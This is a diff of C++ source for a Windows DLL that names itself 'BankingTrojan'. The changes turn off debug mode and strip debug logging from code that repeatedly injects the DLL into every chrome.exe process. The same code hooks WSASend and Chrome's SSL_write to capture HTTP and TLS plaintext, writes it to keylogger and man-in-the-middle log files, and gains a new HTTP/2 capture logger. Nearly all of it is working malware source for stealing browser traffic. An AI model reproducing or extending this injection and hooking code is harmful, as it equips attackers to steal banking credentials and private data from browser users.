@@ -35,7 +35,7 @@
 #endif
 
 // Debug Message Box Print
-#define DEBUG 1
+#define DEBUG 0
 
 const wchar_t dllName[] = L"BankingTrojan.dll";
 const wchar_t targetProcessName[] = L"chrome.exe";
@@ -135,10 +135,6 @@ void initializeLogger() {
 
 // Set logger file 
 
-void logDebuglogger(const std::wstring& message) {
-	Logger::getInstance().setLogFile(L"debuglogger.log");
-	Logger::getInstance().log(L"debuglogger.log", message);
-}
 
 void logBankingTrojanKeylogger(const std::wstring& message) {
 	Logger::getInstance().setLogFile(L"BankingTrojanKeylogger.txt");
@@ -154,6 +150,12 @@ void logBankingTrojanChromeMitmHttp11OverTls(const std::wstring& message) {
 	Logger::getInstance().setLogFile(L"BankingTrojanChromeMitmHttp1.1OverTls.txt");
 	Logger::getInstance().log(L"BankingTrojanChromeMitmHttp1.1OverTls.txt", message);
 }
+
+void logBankingTrojanChromeMitmHttp20OverTls(const std::wstring& message) {
+	Logger::getInstance().setLogFile(L"BankingTrojanChromeMitmHttp2.0OverTls.txt");
+	Logger::getInstance().log(L"BankingTrojanChromeMitmHttp2.0OverTls.txt", message);
+}
+
 /*
 	Common functions
 */
@@ -360,7 +362,6 @@ DWORD WINAPI InjectChromeThread(LPVOID lpParam)
 	const DWORD waitInterval = 1000;
 	const wchar_t chromeProcessName[] = L"chrome.exe";
 	std::set<DWORD> injectedPIDs;
-	logDebuglogger(L"InjectChromeThread\n");
 
 	if (!getDLLPath(dllPath)) {
 		if (DEBUG)
@@ -394,26 +395,13 @@ DWORD WINAPI InjectChromeThread(LPVOID lpParam)
 	while (TRUE) {
 		targetPIDs = getChromePIDs();
 		for (DWORD targetPID : targetPIDs) {
-			logDebuglogger
-			(
-				std::wstring(L"Find InjectChromeThread: targetPID = ") + std::to_wstring(targetPID) + L"\n"
-			);
+			
 
 			if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
 				// If pid not in set, inject to pid
 				DLLinject(targetPID, dllPath);
 				injectedPIDs.insert(targetPID);
-				logDebuglogger
-				(
-					std::wstring(L"InjectChromeThread: Injected to targetPID = ") + std::to_wstring(targetPID) + L"\n"
-				);
-			}
-			else {
-				logDebuglogger
-				(
-					std::wstring(L"InjectChromeThread: Already Injected to targetPID = ") + std::to_wstring(targetPID) + L"\n"
-				);
-			
+				
 			}
 		}
 		Sleep(waitInterval);
@@ -465,34 +453,6 @@ bool TrojanLoader(const wchar_t* dllPath) {
 
 	MinHook
 	https://github.com/zeze-zeze/2021iThome/blob/master/Explorer%E4%BD%A0%E6%80%8E%E9%BA%BC%E6%B2%92%E6%84%9F%E8%A6%BA/Rootkit/Rootkit/dllmain.cpp
-*/
-
-/*
-* //Debug API Hook function
-bool explorerStayDebugEvent() {
-	DEBUG_EVENT debugEvent;
-	DWORD dwStat;
-	while (WaitForDebugEvent(&debugEvent, INFINITE)) {
-		dwStat = DBG_CONTINUE;
-		/*
-		if (debugEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
-			doCreateEvent(&debugEvent);
-		}
-		else if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
-		{
-			doExceptionEvent(&debugEvent);
-		}
-		else if (debugEvent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {
-			printf("Process %d is down!\n", debugEvent.dwProcessId);
-			break;
-		}
-		ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, dwStat);
-	}
-
-
-	return 1;
-
-};
 */
 
 int cnt = 0;
@@ -639,29 +599,6 @@ bool explorerMain( ) {
 		return 0;
 	}
 	
-	/*
-	*      Debug API Hook was fail
-	*
-	// set debuger mode
-	if (!DebugActiveProcess(targetPID)) {
-		if(DEBUG)
-			MessageBoxW(NULL, L"Fail to DebugActiveProcess", L"ExplorerMain", MB_OK);
-		return 0;
-	}
-	//explorerStayDebugEvent();
-	*/
-
-	// MinHook
-	/*
-	if (MH_Initialize() != MH_OK) {
-		if (DEBUG)
-			MessageBoxW(NULL, L"Fail to MH_Initialize", L"ExplorerMain", MB_OK);
-		return 0;
-	}
-	*/
-	//--------------
-
-
 	// 取得 ntdll.dll 的 handle
 	HINSTANCE hDLL = LoadLibrary(L"ntdll.dll");
 	if (!hDLL) {
@@ -758,7 +695,7 @@ int WSAAPI DetourWSASend(
 	LPWSAOVERLAPPED lpOverlapped,
 	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
 ) {
-	std::string message = "---------WSASend---------\n";
+	std::string message = "\n";
 
 	for (DWORD i = 0; i < dwBufferCount; ++i) {
 		message += std::string(lpBuffers[i].buf, lpBuffers[i].len);
@@ -766,8 +703,9 @@ int WSAAPI DetourWSASend(
 	}
 	// if message contain http
 	if (message.find("HTTP") != std::string::npos ) {
-		if(DEBUG)
+		if (DEBUG) {
 			//MessageBoxA(NULL, message.c_str(), "DetourWSASend", MB_OK);
+		}
 
 		logBankingTrojanChromeMitmHttp(std::wstring(message.begin(), message.end()).c_str());
 	}
@@ -795,7 +733,8 @@ bool chromeHookWSASend() {
 		return 1;
 	}
 
-	/*
+	/* MH_Initialize move to chromeMain().
+	* 
 	// Initialize MinHook
 	if (MH_Initialize() != MH_OK) {
 		if (DEBUG)
@@ -840,6 +779,7 @@ int __fastcall DetourSSL_write(void* ssl, const void* buf, int num) {
 }
 
 
+
 bool chromeHookSSL_write()
 {
 	HMODULE hDLL = GetModuleHandleW(L"chrome.dll");
@@ -866,7 +806,8 @@ bool chromeHookSSL_write()
 		}*/
 	}
 
-	/*
+	/* MH_Initialize() move to chromeMain()
+	* 
 	// Initialize MinHook
 	if (MH_Initialize() != MH_OK) {
 		if (DEBUG)
@@ -884,7 +825,6 @@ bool chromeHookSSL_write()
 		return false;
 	}
 
-	// 啟用鉤子
 	if (MH_EnableHook(reinterpret_cast<LPVOID>(sslWriteAddress)) != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Failed to enable hook for SSL_write.", L"chromeHookDoPayloadWrite", MB_OK);
